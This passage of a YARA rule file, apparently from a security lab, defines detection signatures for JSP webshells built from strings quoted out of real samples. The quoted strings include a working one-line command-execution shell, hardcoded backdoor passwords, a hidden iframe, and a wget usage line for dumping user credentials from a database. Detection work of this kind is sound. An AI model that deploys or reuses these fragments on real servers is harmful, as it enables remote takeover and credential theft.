        $s8 = "Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}v" fullword ascii
        $s9 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
        $s10 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
        $s11 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
        $s12 = "(\"z1\")+\"\");String z2=EC(request.getParameter(\"z2\")+\"\");sb.append(\"->\"+\"|\");String s=request.getSession().getServletC" ascii
        $s13 = "\"--f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){" ascii
        $s14 = "cs=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.setContentType(\"text/html\");response.setCh" ascii
        $s15 = "b.append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.close();c.c" ascii
        $s16 = "}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeU" ascii
        $s17 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
        $s18 = "s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim()" ascii
        $s19 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
        $s20 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_108c5eeb85f9a2bfb896a1c42a00978f5770e195
{
    meta:
        description = "jsp - file 108c5eeb85f9a2bfb896a1c42a00978f5770e195.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7bf6f0b112bbc9855fbe4dbc56b2c1f26065d06605d6b6fd73db59bd5e226097"
    strings:
        $s1 = "<input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">" fullword ascii
        $s2 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
        $s3 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
        $s4 = "<form name=\"frmUpload\" method=\"post\" action=\"\">" fullword ascii
        $s5 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword ascii
        $s6 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword ascii
        $s7 = "<textarea name=\"context\" id=\"context\" style=\"width: 51%; height: 150px;\"></textarea>" fullword ascii
        $s8 = "if(request.getParameter(\"context\")!=null)" fullword ascii
        $s9 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword ascii
        $s10 = "pt.write(context.getBytes());" fullword ascii
        $s11 = "out.println(\"<font>shib</font>\");" fullword ascii
        $s12 = "out.println(\"<font>ok</font>\");" fullword ascii
        $s13 = "out.println(\"<font>ok</font></a>\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( 8 of them ) ) or ( all of them )
}

rule sig_27269b6fcff8ddc3c06322f1f9247d5af3ac6624
{
    meta:
        description = "jsp - file 27269b6fcff8ddc3c06322f1f9247d5af3ac6624.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "35b577a4db0f03cfb9a5f1748a6f00981afddc62413045f559b552b28c19c220"
    strings:
        $s1 = "<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s09
{
    meta:
        description = "jsp - file s09.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $s1 = "private static final String PW = \"shell007\"; //password" fullword ascii
        $s2 = "System.setProperty(\"sun.net.client.defaultConnectTimeout\", String" fullword ascii
        $s3 = "System.setProperty(\"sun.net.client.defaultReadTimeout\", String" fullword ascii
        $s4 = "responseContent = tempStr.toString();" fullword ascii
        $s5 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword ascii
        $s6 = "String tempLine = rd.readLine();" fullword ascii
        $s7 = "for (int i = SysInfo.length() - 1; i >= 0; i--) {" fullword ascii
        $s8 = "tempLine = rd.readLine();" fullword ascii
        $s9 = "tempStr.append(tempLine);" fullword ascii
        $s10 = "StringBuffer tempStr = new StringBuffer();" fullword ascii
        $s11 = "url_con = (HttpURLConnection) url.openConnection();" fullword ascii
        $s12 = "String c=\"\\n\\r\"; long d=127,  f=11, j=12, h=14,  m=31, r=83, k=1, n=8,  s=114, u=-5, v=5,a=0;" fullword ascii
        $s13 = "BufferedReader rd = new BufferedReader(new InputStreamReader(in," fullword ascii
        $s14 = "InputStream in = url_con.getInputStream();" fullword ascii
        $s15 = "String crlf=System.getProperty(\"line.separator\");" fullword ascii
        $s16 = "while (tempLine != null)" fullword ascii
        $s17 = "HttpURLConnection url_con = null;" fullword ascii
        $s18 = "private static int readTimeOut = 10000;" fullword ascii
        $s19 = "url_con.getOutputStream().close();" fullword ascii
        $s20 = "url_con.getOutputStream().flush();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_77110bad5de094ad8416b264937698ba2f767771
{
    meta:
        description = "jsp - file 77110bad5de094ad8416b264937698ba2f767771.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "09b677ca8806f681cb31ad69b8ec79b3416b491a04b8283d606ac7ba7edffeda"
    strings:
        $x1 = "Hashtable ht = parser.processData(request.getInputStream(), \"-\", tempdir);" fullword ascii
        $s2 = "response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"bagheera.zip\\\"\");" fullword ascii
        $s3 = "response.setHeader (\"Content-Disposition\", \"attachment;filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
        $s4 = ".login { font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 8pt; color: #666666; width:320px; }" fullword ascii
        $s5 = "public Hashtable processData(ServletInputStream is, String boundary, String saveInDir)" fullword ascii
        $s6 = "else if (ext.equals(\".htm\")||ext.equals(\".html\")||ext.equals(\".shtml\")) response.setContentType(\"text/html\");" fullword ascii
        $s7 = "v1.001 By Bagheera<a href=\"http://jmmm.com\">http://jmmm.com</a>" fullword ascii
        $s8 = "else if (ext.equals(\".mid\")||ext.equals(\".midi\")) response.setContentType(\"audio/x-midi\");" fullword ascii
        $s9 = "else if (ext.equals(\".mov\")||ext.equals(\".qt\")) response.setContentType(\"video/quicktime\");" fullword ascii
        $s10 = "*E-mail:bagheera@beareyes.com                                                        *" fullword ascii
        $s11 = "if ((request.getContentType()!=null)&&(request.getContentType().toLowerCase().startsWith(\"multipart\"))){" fullword ascii
        $s12 = "else if (ext.equals(\".tiff\")||ext.equals(\".tif\")) response.setContentType(\"image/tiff\");" fullword ascii
        $s13 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Delete Files\"))){" fullword ascii
        $s14 = "case 1:return f1.getAbsolutePath().toUpperCase().compareTo(f2.getAbsolutePath().toUpperCase());" fullword ascii
        $s15 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Save as zip\"))){" fullword ascii
        $s16 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Create Dir\"))){" fullword ascii
        $s17 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Move Files\"))){" fullword ascii
        $s18 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Copy Files\"))){" fullword ascii
        $s19 = "else if ((request.getParameter(\"Submit\")!=null)&&(request.getParameter(\"Submit\").equals(\"Create File\"))){" fullword ascii
        $s20 = "<td title=\"Enter the new filename\"><input type=\"text\" name=\"new_name\" value=\"<%=ef.getName()%>\"></td>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule bcf292f93cd3b73d1bb6d95b2ac6396d2b6e7b67
{
    meta:
        description = "jsp - file bcf292f93cd3b73d1bb6d95b2ac6396d2b6e7b67.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9907c1f10ca7ddde1c8f9a652506737b86e60eb8b537c8a42d4fad55e199d3a7"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule e76e2cc724464a92fa497d74524db6fc9b42c7ec
{
    meta:
        description = "jsp - file e76e2cc724464a92fa497d74524db6fc9b42c7ec.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "683bcd5fce3d71c8fd2c0e4c8a5a7254033638848035b25f04d82fe44a992e0d"
    strings:
        $x1 = "  _jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword wide
        $s2 = "  p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword wide
        $s3 = "  _jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword wide
        $s4 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword wide
        $s5 = "  _jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword wide
        $s6 = "  sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"\\\" />\";" fullword wide
        $s7 = " public void setPassword(String password) throws JshellConfigException {" fullword wide
        $s8 = "  p = Pattern.compile(\"private\\\\sint\\\\s_sessionOutTime\\\\s=\\\\s\" + _sessionOutTime);" fullword wide
        $s9 = " sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=\" + curUri + \"&curPath=\" + path + \"\\\" />\";" fullword wide
        $s10 = "//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////" fullword wide /* reversed goodware string '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////' */
        $s11 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword wide
        $s12 = "  retStr = \"<font color=\\\"red\\\">bad command \\\"\" + cmd + \"\\\"</font>\";" fullword wide
        $s13 = "  <td align=\"right\">created by <a href=\"mailto:luoluonet@hotmail.com\">luoluo</a> and welcome to <a href=\"http://www.ph4nt0m" wide
        $s14 = "  p = Pattern.compile(\"private\\\\sString\\\\s_encodeType\\\\s=\\\\s\\\"\" + _encodeType + \"\\\"\");" fullword wide
        $s15 = "  <td align=\"center\" class=\"datarows\"><%=System.getProperty(\"java.io.tmpdir\")%></td>" fullword wide
        $s16 = "   _dbConnection = DriverManager.getConnection(_url, User, Password);" fullword wide
        $s17 = "public String DBExecute(String sql) {" fullword wide
        $s18 = " <form name=\"form2\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=\" + action%>\">" fullword wide
        $s19 = " <form method=\"post\" name=\"form2\" action=\"<%= request.getRequestURI() + \"?action=\" + action%>\">" fullword wide
        $s20 = "  <td align=\"center\" class=\"datarows\"><%=request.getRemoteUser() == null ? \"\" : request.getRemoteUser()%></td>" fullword wide
    condition:
        ( uint16(0) == 0xfeff and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0bf6c1e069a14181eb642fa939a059efddc8c82e
{
    meta:
        description = "jsp - file 0bf6c1e069a14181eb642fa939a059efddc8c82e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
        $s3 = "sRet += \" <td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s4 = "sRet += \" <td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s5 = "t;\" + strCut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s6 = "+ pathConvert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s7 = "sRet += \" <td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s8 = "private String _password = \"admin\";" fullword ascii
        $s9 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s10 = "sRet += \" <textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s11 = "if (request.getParameter(\"command\") != null) { " fullword ascii
        $s12 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
        $s13 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s14 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s15 = "sRet += \" if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
        $s16 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\">&nbsp;8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-ser" fullword ascii
        $s17 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
        $s18 = "sRet += \" if (newName != null && newName != false && ltrim(newName) != \\\"\\\") {\\n\";" fullword ascii
        $s19 = "sRet += \" <form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath" ascii
        $s20 = "<TD align=\"right\"><FONT color=\"#d2d8ec\"><b>JFolder</b>_By_<b>hack520</b></FONT></TD>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_28f0cad6197cce10791a400a28f611b8400a8aec
{
    meta:
        description = "jsp - file 28f0cad6197cce10791a400a28f611b8400a8aec.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
    strings:
        $s1 = "<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url='></SCRIPT>" fullword ascii
        $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
        $s3 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
        $s4 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s5 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s6 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s7 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s8 = "private String _password = \"520520\";" fullword ascii
        $s9 = "<input type=\"hidden\" name=\"__VIEWSTATE\" value=\"dDwtMTQyNDQzOTM1NDt0PDtsPGk8OT47PjtsPHQ8cDxsPGVuY3R5cGU7PjtsPG11bHRpc" fullword ascii
        $s10 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s11 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s12 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s13 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s14 = "3J5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s15 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s16 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s17 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s18 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\">&nbsp;8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-ser" fullword ascii
        $s19 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s20 = "<TD align=\"right\"><FONT color=\"#d2d8ec\"><b>JFolder</b>_By_<b>hack520</b></FONT></TD>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s10
{
    meta:
        description = "jsp - file s10.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7fa62fd590580a8962f83e43e1d33d47dda9ab1a8876ef67fef86cf474594fea"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $x2 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
        $s3 = ": http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font" ascii
        $s4 = ": http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s7 = "System.out.println(strCommand);" fullword ascii
        $s8 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s9 = "cqq1978@Gmail.com" fullword ascii
        $s10 = "strCommand[1]=strShell[1];" fullword ascii
        $s11 = "strCommand[0]=strShell[0];" fullword ascii
        $s12 = "String[] strExecute      = {\"gL\",\"Execute\"};" fullword ascii
        $s13 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s14 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s15 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s16 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s17 = "<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s18 = "//out.println(path + f1.getName());" fullword ascii
        $s19 = "String[] strCommand=new String[3];" fullword ascii
        $s20 = "private final static int languageNo=1; //Language,0 : Chinese; 1:English" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7de0f7d7b1db6158355f17e4c5e4a1be0d2c6e0f
{
    meta:
        description = "jsp - file 7de0f7d7b1db6158355f17e4c5e4a1be0d2c6e0f.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e2267655902470372107057a01a36fe882229f1fc5047ee3215dc2619496e680"
    strings:
        $s1 = "<a href=\"?path=<%String tempfilepath1=request.getParameter(\"path\"); if(tempfilepath!=null) path=tempfilepath;%><%=path%>&" fullword ascii
        $s2 = "cmd = (String)request.getParameter(\"command\");result = exeCmd(cmd);%>" fullword ascii
        $s3 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword ascii
        $s4 = "<input type=\"submit\" name=\"Button\" value=\"Login\" id=\"Button\" title=\"Click here to login\" class=\"button\" /> " fullword ascii
        $s5 = "if (password == null && session.getAttribute(\"password\") == null) {" fullword ascii
        $s6 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.library.path\").replaceAll(env.queryHashtable(\"path.sep" fullword ascii
        $s7 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.io.tmpdir\")%></td>" fullword ascii
        $s8 = "<td width=\"20%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.runtime.version\")%></td>" fullword ascii
        $s9 = "<td height=\"22\" colspan=\"3\">&nbsp;<%= request.getServerName() %>(<%=request.getRemoteAddr()%>)</td>" fullword ascii
        $s10 = "<a href=\"<%=selfName %>?path=<%=path%><%=fList[j].getName()%>\\\"> <%=fList[j].getName()%></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" fullword ascii
        $s11 = "String password=request.getParameter(\"password\");" fullword ascii
        $s12 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword ascii
        $s13 = "//if(request.getQueryString()!=null&&request.getQueryString().indexOf(act,0)>=0)action=request.getParameter(act);" fullword ascii
        $s14 = "tempfilename=(String)session.getId();" fullword ascii
        $s15 = "<textarea name=\"content\" cols=\"105\" rows=\"30\"><%=readAllFile(editfile)%></textarea>" fullword ascii
        $s16 = "<td colspan=\"3\">&nbsp;<%=env.queryHashtable(\"os.name\")%> <%=env.queryHashtable(\"os.version\")%> " fullword ascii
        $s17 = "{editfilecontent=new String(editfilecontent1.getBytes(\"ISO8859_1\"));}" fullword ascii
        $s18 = "* <p>Company: zero.cnbct.org</p>" fullword ascii
        $s19 = "//String tempfilename=request.getParameter(\"file\");" fullword ascii
        $s20 = "String editfilecontent1=request.getParameter(\"content\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule e322ff335ed9866caf9c0f15e2471873a2b4a7d3
{
    meta:
        description = "jsp - file e322ff335ed9866caf9c0f15e2471873a2b4a7d3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
    strings:
        $s1 = "</font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.7jyewu.cn </font>\"};" fullword ascii
        $s2 = "<center><a href=\"http://www.7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a> ,All Rights Reserved." fullword ascii
        $s3 = "<a href=\"http://www.7jyewu.cn\" target=\"_blank\">http://www.7jyewu.cn/</a></b>" fullword ascii
        $s4 = "<br>Any question, please email me admin@syue.com" fullword ascii
        $s5 = "<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>" fullword ascii
        $s6 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s8 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s10 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s11 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s12 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s13 = "<title>JSP Shell " fullword ascii
        $s14 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s15 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s16 = "private final static int languageNo=0; //" fullword ascii
        $s17 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them ) ) or ( all of them )
}

rule sig_9d0e72dbbf8ef296ec5f651cffcfdc78fc0ad100
{
    meta:
        description = "jsp - file 9d0e72dbbf8ef296ec5f651cffcfdc78fc0ad100.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f273b8b90a4bbe39da1773f8dbd71ec4088d84bf8b62221531c234858375fd5e"
    strings:
        $s1 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";" fullword ascii
        $s2 = "<script type=\"text/javascript\" src=\"jquery-easyui-1.2.3/jquery-1.4.4.min.js\"></script>" fullword ascii
        $s3 = "<script type=\"text/javascript\" src=\"jquery-easyui-1.2.3/jquery.easyui.min.js\"></script>" fullword ascii
        $s4 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"jquery-easyui-1.2.3/themes/default/easyui.css\">" fullword ascii
        $s5 = "$('#tt2').tree('options').url = \"selectChild.action?checkid=\" + node.id;                       " fullword ascii
        $s6 = "<script type=\"text/javascript\" src=\"jquery-easyui-1.2.3/locale/easyui-lang-zh_CN.js\"></script>" fullword ascii
        $s7 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"jquery-easyui-1.2.3/themes/icon.css\">" fullword ascii
        $s8 = "<input type=\"password\" name=\"password\" size=5>" fullword ascii
        $s9 = "<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"utf-8\"%>" fullword ascii
        $s10 = "<%@include file=\"/jsp/include/common.jsp\"%>" fullword ascii
        $s11 = "var nodes = $('#tt2').tree('getChecked');" fullword ascii
        $s12 = "String path = request.getContextPath();" fullword ascii
        $s13 = "<input type=\"text\" name=\"userName\"/>" fullword ascii
        $s14 = "<div  style=\"position:relative;width:200px;height:200px;\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_94ab67132ee34b6423c3141938a54fb7ed4a951e
{
    meta:
        description = "jsp - file 94ab67132ee34b6423c3141938a54fb7ed4a951e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7cbffe8e75a77208410bd986b985f1a84a59432301556516c94fc6ca336c761d"
    strings:
        $x1 = "//Usage: wget \"http://xxx.com/wget_db.jsp?sn=0&en=5000000&ln=50000\" -O gavin.sql" fullword ascii
        $s2 = "java.sql.ResultSet rs = statement.executeQuery(newSql);" fullword ascii
        $s3 = "String url=\"jdbc:mysql://\"+dbAddress+\"/\"+dbName+\"?user=\"+userName+\"&password=\"+userPasswd;" fullword ascii
        $s4 = "Connection connection=DriverManager.getConnection(url);" fullword ascii
        $s5 = "String columns[] = \"username,password\".split(\",\");" fullword ascii
        $s6 = "String newSql = sql + \" limit \" + newStartNum + \",\" + MAX_LIMIT_NUM;" fullword ascii
        $s7 = "out.print(rs.getString(j)+\"-->\");" fullword ascii
        $s8 = "String dbAddress = \"127.0.0.1:3306\";" fullword ascii
        $s9 = "<%@ page contentType=\"text/html; charset=utf-8\" %>" fullword ascii
        $s10 = "out.println(rs.getString(j));" fullword ascii
